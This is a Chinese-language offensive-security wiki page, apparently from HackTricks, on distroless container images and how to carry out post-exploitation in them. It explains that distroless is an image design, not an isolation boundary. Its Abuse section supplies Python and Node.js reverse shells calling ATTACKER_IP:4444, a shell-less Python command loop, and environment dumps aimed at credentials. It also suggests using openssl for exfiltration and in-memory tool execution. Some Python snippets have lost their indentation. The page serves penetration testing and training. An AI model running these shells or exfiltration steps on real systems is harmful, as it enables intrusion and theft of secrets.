# Distroless 容器

{{#include ../../../banners/hacktricks-training.md}}

## 概述

一个 **distroless** 容器镜像是只包含运行单个特定应用所需的 **最小运行时组件** 的镜像，同时有意移除常见的发行工具，例如包管理器、shell，以及大量通用的用户态实用程序。实际上，distroless 镜像通常只包含应用二进制或运行时、其共享库、证书包和非常精简的文件系统布局。

关键点不是 distroless 引入了新的内核隔离原语。Distroless 是一种 **镜像设计策略**。它改变的是容器文件系统内部可用的内容，而不是内核如何隔离容器。这一区别很重要，因为 distroless 主要通过减少攻击者在获得代码执行后的可用工具来强化环境。它并不替代 namespaces、seccomp、capabilities、AppArmor、SELinux 或任何其他运行时隔离机制。

## Why Distroless Exists

Distroless 镜像主要用于减少：

- 镜像体积
- 镜像的运维复杂度
- 可能含有漏洞的包和二进制数量
- 默认情况下攻击者可用的事后利用工具数量

这就是为什么 distroless 镜像在生产应用部署中很受欢迎。一个没有 shell、没有包管理器、几乎没有通用工具的容器通常在运维上更容易把控，并且在被入侵后更难以被交互式滥用。

一些知名的 distroless 风格镜像家族示例包括：

- Google's distroless images
- Chainguard hardened/minimal images

## Distroless Does Not Mean

一个 distroless 容器并不等同于：

- 自动成为 rootless
- 自动非特权
- 自动只读
- 自动受 seccomp、AppArmor 或 SELinux 保护
- 自动免于 container escape

仍然可以用 `--privileged`、共享主机命名空间、危险的 bind mounts，或挂载的 runtime socket 来运行 distroless 镜像。在这种情况下，镜像可能很小，但容器仍可能极度不安全。Distroless 改变的是 **userland attack surface**，而不是 **kernel trust boundary**。

## 典型的运行特性

当你入侵一个 distroless 容器时，第一个注意到的通常是常见假设不再成立。可能没有 `sh`、没有 `bash`、没有 `ls`、没有 `id`、没有 `cat`，有时甚至没有按你惯常手法工作的 libc 环境。这会影响进攻和防守双方，因为缺乏工具会使调试、事件响应和事后利用有所不同。

最常见的模式是：

- 应用运行时存在，但几乎别的都没有
- 基于 shell 的 payload 会失败，因为没有 shell
- 常见的枚举一行命令会失败，因为辅助二进制缺失
- 文件系统保护（例如只读 rootfs 或在可写 tmpfs 上的 `noexec`）也常常存在

这种组合通常就是人们所说的“weaponizing distroless”的原因。

## Distroless And Post-Exploitation

在 distroless 环境中，主要的进攻挑战往往不是初始的 RCE，而是接下来该怎么办。如果被利用的工作负载在像 Python、Node.js、Java 或 Go 这样的语言运行时中给出代码执行，你可能能够运行任意逻辑，但无法通过在其他 Linux 目标上常见的以 shell 为中心的工作流来操作。

这意味着事后利用通常会转向三条路径之一：

1. 直接使用现有的语言运行时来枚举环境、打开 socket、读取文件，或注入内存中执行的载荷。
2. 如果文件系统是只读或可写位置被挂载为 `noexec`，则把你自己的工具带入内存中运行。
3. 滥用镜像中已经存在的二进制（如果应用或其依赖包含意外有用的东西）。

## Abuse

### Enumerate The Runtime You Already Have

在许多 distroless 容器中没有 shell，但仍然存在应用运行时。如果目标是 Python 服务，那么 Python 就在；如果目标是 Node.js，Node 就在。这通常提供了足够的功能来枚举文件、读取环境变量、打开反向 shell，并在不调用 `/bin/sh` 的情况下在内存中阶段性载入执行。

一个用 Python 的简单示例：
```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```
一个使用 Node.js 的简单示例：
```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```
影响：

- 恢复环境变量，通常包括凭证或服务端点
- 在没有 `/bin/ls` 的情况下进行文件系统枚举
- 识别可写路径和挂载的 secrets

### 没有 `/bin/sh` 的 Reverse Shell

如果镜像不包含 `sh` 或 `bash`，经典的基于 shell 的 reverse shell 可能会立即失败。在这种情况下，使用已安装的语言 runtime。

Python reverse shell:
```bash
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```
如果 `/bin/sh` 不存在，请将最后一行替换为直接由 Python 驱动的命令执行或 Python REPL 循环。

Node reverse shell:
```bash
node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```
再次，如果 `/bin/sh` 不存在，直接使用 Node 的文件系统、进程和网络 API，而不是派生一个 shell。

### 完整示例：无 shell 的 Python 命令循环

如果镜像有 Python 但根本没有 shell，一个简单的交互循环通常足以保持完整的 post-exploitation 能力：
```bash
python3 - <<'PY'
import os,subprocess
while True:
cmd=input("py> ")
if cmd.strip() in ("exit","quit"):
break
p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(p.stdout, end="")
print(p.stderr, end="")
PY
```
这不需要交互式 shell 二进制。從攻击者的角度来看，影响与基本 shell 实质相同：命令执行、枚举，以及通过现有 runtime 阶段化部署后续 payload。

### 内存中工具执行

Distroless images 通常与下列项组合：

- `readOnlyRootFilesystem: true`
- writable but `noexec` tmpfs such as `/dev/shm`
- a lack of package management tools

这种组合使得经典的“下载二进制到磁盘并运行”工作流变得不可靠。在这些情况下，memory execution techniques 成为主要手段。

The dedicated page for that is:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

那里最相关的技术有：

- `memfd_create` + `execve` via scripting runtimes
- DDexec / EverythingExec
- memexec
- memdlopen

### 镜像中已存在的二进制

一些 distroless images 仍然包含运行所需的二进制，这些在被攻破后会变得有用。反复观察到的一个例子是 `openssl`，因为应用有时需要它来处理 crypto 或 TLS 相关的任务。

一个快速搜索模式是：
```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```
如果存在 `openssl`，它可能可用于：

- 出站 TLS 连接
- 通过允许的出口通道进行数据外传
- 通过编码/加密的 blob 暂存 payload 数据

具体滥用取决于实际安装的内容，但总体思想是 distroless 并不意味着 "完全没有任何工具"；它意味着 "比普通发行版镜像少得多的工具"。

## 检查

这些检查的目的是确定镜像在实践中是否真的 distroless，以及哪些运行时或辅助二进制文件仍然可用于 post-exploitation。
```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```
有趣的地方：

- 如果没有 shell 可用，但存在像 Python 或 Node 这样的运行时，post-exploitation 应当转向基于运行时的执行。
- 如果根文件系统为只读且 `/dev/shm` 可写但带有 `noexec`，则内存执行技术变得更加相关。
- 如果存在诸如 `openssl`、`busybox` 或 `java` 之类的辅助二进制文件，它们可能提供足够的功能来引导进一步的访问。

## 运行时默认值

| Image / platform style | Default state | Typical behavior | Common manual weakening |
| --- | --- | --- | --- |
| Google distroless style images | 按设计最小化的 userland | 无 shell、无包管理器，仅包含应用/运行时依赖 | 添加调试层、sidecar shells、复制 busybox 或其他工具 |
| Chainguard minimal images | 按设计最小化的 userland | 精简的包面，通常专注于单一运行时或服务 | 使用 `:latest-dev` 或调试变体，在构建期间复制工具 |
| Kubernetes workloads using distroless images | 取决于 Pod 配置 | Distroless 仅影响用户态；Pod 的安全姿态仍取决于 Pod 规范和运行时默认设置 | 添加短暂的调试容器、主机挂载、特权 Pod 设置 |
| Docker / Podman running distroless images | 取决于运行标志 | 文件系统最小化，但运行时安全仍依赖于标志和守护进程配置 | `--privileged`、主机命名空间共享、runtime socket 挂载、可写的主机绑定 |

关键点在于 distroless 是一种 **镜像属性**，而不是运行时保护。它的价值在于在被攻破后减少文件系统内可用的内容。

## 相关页面

对于在 distroless 环境中常需的文件系统与内存执行绕过：

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

对于仍适用于 distroless 工作负载的容器运行时、socket 与挂载滥用：

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
